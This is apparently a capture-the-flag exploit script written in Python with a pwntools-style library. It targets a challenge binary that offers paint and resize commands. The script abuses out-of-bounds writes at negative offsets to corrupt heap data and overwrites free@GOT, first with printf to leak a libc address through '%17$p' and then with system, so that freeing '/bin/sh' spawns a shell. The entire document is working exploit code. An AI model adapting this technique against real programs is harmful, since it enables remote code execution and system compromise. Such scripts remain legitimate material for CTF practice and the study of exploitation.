#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

context.log_level = 'debug'
exe = context.binary = ELF('./chall_patched', checksec=False)
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
b *0x40152c
b *0x40159B
b *0x401605
b *0x4015D5
c
'''

def start(argv=[]):
    if args.LOCAL:
        p = exe.process()
    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p

def paint(arg1: int, arg2: int, arg3: int):
    sla(b'> ', f'p {arg1} {arg2} {hex(arg3)}'.encode())

def resize(arg1: int, arg2: int):
    sla(b'> ', f'r {arg1} {arg2}'.encode())

def wtf(offset: int, data: bytes):
    for i in range(8):
        paint(0, offset + i, data & 0xff)
        data >>= 8

# ==================== EXPLOIT ====================
p = start()

paint(0, -0x290, 0x1)
wtf(-0x210, 0x404070)
resize(1, 0x10)

wtf(-0x70, exe.plt.printf) # Overwrite free@GOT -> printf@PLT

if args.GDB:
    gdb.attach(p, gdbscript=gdbscript)
    pause()

fmt = b'%17$p'
for i, data in enumerate(fmt):
    paint(0, i, data)

resize(20, 20) # leak

leak = int(ru('.')[:-1], 16)
libc.address = leak - 0x2a1ca
slog('libc base @ %#x', libc.address)

paint(0, -0x290, 0x1)
wtf(-0x210, 0x404070)
resize(1, 0x10)

wtf(-0x70, libc.sym.system) # Overwrite free@GOT -> system

binsh = b'/bin/sh\0'
for i, data in enumerate(binsh):
    paint(0, i, data)

# free("/bin/sh") = system("/bin/sh")
resize(20, 20)

interactive()
